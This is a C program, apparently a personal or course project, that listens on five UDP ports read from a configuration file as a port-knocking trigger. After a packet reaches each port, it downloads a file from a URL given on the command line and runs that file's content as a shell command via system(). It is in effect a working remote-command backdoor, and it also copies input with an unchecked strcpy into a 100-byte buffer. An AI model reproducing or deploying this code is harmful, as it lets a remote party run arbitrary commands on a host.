/*
    Raw UDP sockets
*/

// compile with gcc -o Receive_UDP_Socket Receive_UDP_Socket.c -lcurl

#include <stdio.h> //for printf
#include <string.h> //memset
#include <sys/socket.h>    //for socket ofcourse
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/udp.h>   //Provides declarations for udp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <arpa/inet.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <unistd.h>
#include <curl/curl.h> //apt-get install libcurl4-gnutls-dev

#define BUFLEN 65536  //Max length of buffer
#define PORT 29430   //The port on which to listen for incoming data

  static int knock_sequence[5] = {0, 0, 0, 0, 0};

void die(char *s)
{
    perror(s);
    exit(1);
}

int findLargestNumber(int a, int b, int c, int d, int e) {

  int greatest;

  greatest = a;

  if (b > greatest) {
      greatest = b;
  }
  if (c > greatest) {
    greatest = c;
  }

  if (d > greatest) {
    greatest = d;
  }

  if (e > greatest) {
    greatest = e;
  }

  return greatest;
}

void fetchRemoteFile(char *URL) {

  CURLcode ret;
  CURL *hnd;

  FILE *fp;

//  char *url = "http://127.1.0.1:8000/index.html";
  char outfilename[FILENAME_MAX] = "command";

  hnd = curl_easy_init();

  if (hnd) {
    fp = fopen(outfilename, "wb");
    curl_easy_setopt(hnd, CURLOPT_URL, URL); // should receive from argument
    curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, NULL);
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, fp);

//    curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
//    curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.35.0");
//    curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
//    curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 1L);

    ret = curl_easy_perform(hnd);
    curl_easy_cleanup(hnd);
    hnd = NULL;
    fclose(fp); // finishing reading from remote file and write into local file
  }

  printf("Download completed and write into local file.\n");

  // begin read command from local file (only one line in my code), and execute the command

  FILE *localfp;
  char * line = NULL;
  size_t len = 0;
  ssize_t read;

//  char *readline = NULL;
  char readline[100];

  localfp = fopen("command", "r");

  if (localfp == NULL) {
    printf("Can not open file!\n");
    exit(EXIT_FAILURE);
  }

  while ((read = getline(&line, &len, localfp)) != -1) {
      printf("line: %s", line);
//    readline = line;
      strcpy(readline, line);
//      printf("readline: %s", readline);
  }

  fclose(localfp);

  if (line) {
    free(line);
  }

  // begin to execute command line read from local file

  printf("Begin to execute bash command:\n");
  printf("************************************\n");
  printf("\n");

  system(readline);

/*
  FILE *pp;
  pp = popen("ls -al", "r");  // need to replace with an argument

  if (pp != NULL) {
    while (1) {
      char *line;
      char buf[1000];
      line = fgets(buf, sizeof buf, pp);

      if (line == NULL) {
        break;
      }

//      if (line[0] == 'd') {
      printf("%s", line);
//      }
    }

    pclose(pp);
  }
*/
  printf("\n");
  printf("************************************\n");
  printf("End of executing command.\n");

}


void main(int argc, char* argv[])
{


  if (argc != 3) {
    printf("You should only provide two arguments.\n");
    exit(1);
  }

//  printf("%s\n", argv[1]); // read configuration-file

  FILE *file;
  char *line = NULL;
  size_t len = 0;
  ssize_t read;

  file = fopen(argv[1], "r");

  if (file == NULL) {
    exit(1);
  }

  for (int i = 0; i < 5; i++) {
    if((read = getline(&line, &len, file)) != -1) {
//      printf("%s", line);
        knock_sequence[i] = atoi(line);
//        printf("%d\n", knock_sequence[i]); // print sequences in configuration-file
//        sleep(1);
    }
  }

//  for (int j = 0; j < 5; j++) {
//    printf("knock_sequence[%d]: %d\n", j, knock_sequence[j]);
//  }

  fclose(file);

  if(line) {
    free(line);
  }

    int activate = 1;  // activate is true

    int socket_fd[5];

//    int socket_fd1, socket_fd2, socket_fd3, socket_fd4, socket_fd5;

    for (int i = 0; i < 5; i++) {
      if ((socket_fd[i]=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
      {
          die("socket");
      }
    }

/*
    //create a UDP socket
    if ((socket_fd1=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }

    if ((socket_fd2=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }

    if ((socket_fd3=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }

    if ((socket_fd4=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }

    if ((socket_fd5=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        die("socket");
    }
*/

    struct sockaddr_in addr[5], si_other[5];
//    struct sockaddr_in addr1, addr2, addr3, addr4, addr5;
//    struct sockaddr_in si_other1, si_other2, si_other3, si_other4, si_other5;
    int slen[5];

    for (int j = 0; j < 5; j++) {
      slen[j] = sizeof(si_other[j]);
      memset((char *) &addr[j], 0, sizeof(addr[j]));

      addr[j].sin_family = AF_INET;
      addr[j].sin_port = htons(knock_sequence[j]);
      addr[j].sin_addr.s_addr = htonl(INADDR_ANY);

      if( bind(socket_fd[j], (struct sockaddr*)&addr[j], sizeof(addr[j]) ) == -1)  // only listen on specified port
      {
          die("bind");
      }

      printf("Listen on port %d\n", knock_sequence[j]);
    }

//    int slen1 = sizeof(si_other1);
//    int slen2 = sizeof(si_other2);
//    int slen3 = sizeof(si_other3);
//    int slen4 = sizeof(si_other4);
//    int slen5 = sizeof(si_other5);

    // zero out the structure
//    memset((char *) &addr1, 0, sizeof(addr1));
//    memset((char *) &addr2, 0, sizeof(addr2));
//    memset((char *) &addr3, 0, sizeof(addr3));
//    memset((char *) &addr4, 0, sizeof(addr4));
//    memset((char *) &addr5, 0, sizeof(addr5));

/*
    addr1.sin_family = AF_INET;
    addr1.sin_port = htons(knock_sequence[0]);
    addr1.sin_addr.s_addr = htonl(INADDR_ANY);

    addr2.sin_family = AF_INET;
    addr2.sin_port = htons(knock_sequence[1]);
    addr2.sin_addr.s_addr = htonl(INADDR_ANY);

    addr3.sin_family = AF_INET;
    addr3.sin_port = htons(knock_sequence[2]);
    addr3.sin_addr.s_addr = htonl(INADDR_ANY);

    addr4.sin_family = AF_INET;
    addr4.sin_port = htons(knock_sequence[3]);
    addr4.sin_addr.s_addr = htonl(INADDR_ANY);

    addr5.sin_family = AF_INET;
    addr5.sin_port = htons(knock_sequence[4]);
    addr5.sin_addr.s_addr = htonl(INADDR_ANY);
*/

/*
    if( bind(socket_fd1, (struct sockaddr*)&addr1, sizeof(addr1) ) == -1)  // only listen on specified port
    {
        die("bind");
    }

    printf("\nListen on port %d\n", knock_sequence[0]);

    if( bind(socket_fd2, (struct sockaddr*)&addr2, sizeof(addr2) ) == -1)  // only listen on specified port
    {
        die("bind");
    } else {
      printf("Listen on port %d\n", knock_sequence[1]);
    }

    if( bind(socket_fd3, (struct sockaddr*)&addr3, sizeof(addr3) ) == -1)  // only listen on specified port
    {
        die("bind");
    } else {
      printf("Listen on port %d\n", knock_sequence[2]);
    }

    if( bind(socket_fd4, (struct sockaddr*)&addr4, sizeof(addr4) ) == -1)  // only listen on specified port
    {
        die("bind");
    } else {
      printf("Listen on port %d\n", knock_sequence[3]);
    }

    if( bind(socket_fd5, (struct sockaddr*)&addr5, sizeof(addr5) ) == -1)  // only listen on specified port
    {
        die("bind");
    } else {
      printf("Listen on port %d\n", knock_sequence[4]);
    }
*/


//    char buf1[BUFLEN], buf2[BUFLEN], buf3[BUFLEN], buf4[BUFLEN], buf5[BUFLEN];
    fd_set socks;

//    memset(buf1, 0, BUFLEN);
//    memset(buf2, 0, BUFLEN);
//    memset(buf3, 0, BUFLEN);
//    memset(buf4, 0, BUFLEN);
//    memset(buf5, 0, BUFLEN);


    char buf[BUFLEN];
    memset(buf, 0, BUFLEN);

    int recv_len[5];
//    int recv_len1, recv_len2, recv_len3, recv_len4, recv_len5;

    FD_ZERO(&socks);

    for (int k = 0; k < 5; k++) {
      FD_SET(socket_fd[k], &socks);
    }

//    FD_SET(socket_fd1, &socks);
//    FD_SET(socket_fd2, &socks);

//    if (FD_ISSET(socket_fd2, &socks)){
//      printf("f2: True\n");
//    } else {
//      printf("f2: False\n");
//    }

//    FD_SET(socket_fd3, &socks);

//    if (FD_ISSET(socket_fd3, &socks)){
//      printf("f3: True\n");
//    } else {
//      printf("f3: False\n");
//    }

//    FD_SET(socket_fd4, &socks);

//    if (FD_ISSET(socket_fd3, &socks)){
//      printf("f4: True\n");
//    } else {
//      printf("f4: False\n");
//    }


//    FD_SET(socket_fd5, &socks);

//    if (FD_ISSET(socket_fd3, &socks)){
//      printf("f5: True\n");
//    } else {
//      printf("f5: False\n");
//    }

    int nsocks = findLargestNumber(socket_fd[0], socket_fd[1], socket_fd[2], socket_fd[3], socket_fd[4]) + 1;

//    printf("socket_fd1: %d\n", socket_fd1);
//    printf("socket_fd2: %d\n", socket_fd2);
//    printf("socket_fd3: %d\n", socket_fd3);
//    printf("socket_fd4: %d\n", socket_fd4);
//    printf("socket_fd5: %d\n", socket_fd5);
//    printf("nsocks: %d\n", nsocks);

      in_addr_t lastIPAddress;
      int hit = 0;

while (1) {

    printf("Waiting for UDP packet...\n");
    fflush(stdout);

//    select(nsocks, &socks, NULL, NULL, NULL);

//    if (select(nsocks, &socks, NULL, NULL, NULL) >= 0) {


  //     if ((recv_len[1] = recvfrom(socket_fd[1], buf2, BUFLEN, 0, (struct sockaddr *) &si_other[1], &slen[1])) != -1) {

  //      printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other[1].sin_addr), ntohs(addr[1].sin_port));

  //      continue;

  //    }


      for (int k = 0; k < 5; k++) {

        if ((recv_len[k] = recvfrom(socket_fd[k], buf, BUFLEN, 0, (struct sockaddr *) &si_other[k], &slen[k])) == -1)
        {
            die("recvfrom()");
        }

        printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other[k].sin_addr), ntohs(addr[k].sin_port));

        hit++;
  //      printf("Data: %s\n" , buf);

      }

       if (hit == 5) {
         break;
         activate = 1;
       }


/*
      if (FD_ISSET(socket_fd[0], &socks)) {
        if ((recv_len[0] = recvfrom(socket_fd[0], buf, BUFLEN, 0, (struct sockaddr *) &si_other[0], &slen[0])) == -1)
        {
            die("recvfrom()");
        }

        printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other[0].sin_addr), ntohs(addr[0].sin_port));
        printf("Data: %s\n" , buf);

      }

//      if (FD_ISSET(socket_fd2, &socks)){
//        printf("f2: True\n");
//      } else {
//        printf("f2: False\n");
//      }

        if (FD_ISSET(socket_fd[1], &socks)) {
          if ((recv_len[1] = recvfrom(socket_fd[1], buf, BUFLEN, 0, (struct sockaddr *) &si_other[1], &slen[1])) == -1)
          {
            die("recvfrom()");
          }

          printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other[1].sin_addr), ntohs(addr[1].sin_port));
          printf("Data: %s\n" , buf);
        }


//      if (FD_ISSET(socket_fd3, &socks)){
//        printf("f3: True\n");
//      } else {
//        printf("f3: False\n");
//      }

       if (FD_ISSET(socket_fd[2], &socks)) {
        if ((recv_len[2] = recvfrom(socket_fd[2], buf, BUFLEN, 0, (struct sockaddr *) &si_other[2], &slen[2])) == -1)
        {
            die("recvfrom()");
        }

        printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other[2].sin_addr), ntohs(addr[2].sin_port));
        printf("Data: %s\n" , buf);
      }



//      if (FD_ISSET(socket_fd4, &socks)){
//        printf("f4: True\n");
//      } else {
//        printf("f4: False\n");
//      }

       if (FD_ISSET(socket_fd[3], &socks)) {
        if ((recv_len[3] = recvfrom(socket_fd[3], buf, BUFLEN, 0, (struct sockaddr *) &si_other[3], &slen[3])) == -1)
        {
            die("recvfrom()");
        }

        printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other[3].sin_addr), ntohs(addr[3].sin_port));
        printf("Data: %s\n" , buf);
      }

//      if (FD_ISSET(socket_fd5, &socks)){
//        printf("f5: True\n");
//      } else {
//        printf("f5: False\n");
//      }

       if (FD_ISSET(socket_fd[4], &socks)) {
        if ((recv_len[4] = recvfrom(socket_fd[4], buf, BUFLEN, 0, (struct sockaddr *) &si_other[4], &slen[4])) == -1)
        {
            die("recvfrom()");
        }

        printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other[4].sin_addr), ntohs(addr[4].sin_port));
        printf("Data: %s\n" , buf);

//        break; // break the while loop when all 5 packets are received in sequence
      }

*/

//    }
  } // end of while loop

      if (activate == 1) {
        printf("Begin to fetch remote code...\n");
        fetchRemoteFile(argv[2]); //read URL from argument
      }

      // python -m SimpleHTTPServer
      // starts serving a site from the current directory on port 8000 with directory listing activated
      // accessible from http://127.0.0.1:8000
}
